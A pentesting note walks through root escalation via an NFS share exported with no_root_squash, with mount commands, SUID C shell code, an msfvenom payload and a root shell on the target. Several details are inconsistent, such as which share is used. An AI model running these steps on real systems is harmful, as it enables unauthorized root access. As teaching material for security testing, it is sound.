# NFS

## 01 - Detect

Files were made with NFS that derives the user's ID. If the user is `root`, and **root squashing** is enabled, the ID will instead be set to the `nobody` user. Whatever we have enumerated the server through active fingerprint (go to [[Pentesting Phases/Information Gathering/Active Fingerprinting/Enumeration/NFS|NFS enumeration phase]] section to learn the practical methods) or we have compromised the Linux machine with least privileges.

Let's see the NFS configuration in the `/etc/exports`

```
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

Looks like the `/tmp` directory has `no_root_squash` enabled. Through the attacker's machine we have run as `root` and create a directory to mount point the NFS server.

## 02 - Exploit

```
user@pentestos:~$ sudo su
root@pentestos:~# mkdir /mnt/nfs
root@pentestos:~# mount -o rw,vers=2 <IP>:</directory_name> /mnt/nfs
```

Now we can either generate a `msfvenom` payload or compile our binary in C language using the previous technique about taking advantage of the Cron Job to execute a SUID `/bin/bash`

```
root@pentestos:~# cat shell.c
int main() {
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
}
root@pentestos:~# gcc shell.c -o shell
root@pentestos:~# msfvenom -p linux/x86/exec cmd="/bin/bash -p" -f elf -o /mnt/nfs/shell
root@pentestos:~# chmod +xs /mnt/nfs/shell
```

Now if we return to the compromised machine you can see it has a sticky bit of SUID that can be taken advantaged of all because of enabling the `no_root_squash` from the NFS configuration.

```
root@pentestos:~# ls -lh /mnt/nfs/shell
-rwsr-sr-x 1 root root 16K Jan 21 20:29 /mnt/nfs/shell
```

Now if we check on the compromised target side we can see our shell that has been successfully copied via root

```
$ ls -lh /home/ubuntu/sharedfolder/
total 16K
-rwsr-sr-x 1 root root 16K Jan 22 01:29 shell
$ /home/ubuntu/sharedfolder/shell -p
# whoami
root
```

## 02 - Cleanup

```
# exit
$ whoami
user

root@pentestos:~# rm /mnt/nfs/shell
root@pentestos:~# umount /mnt/nfs
```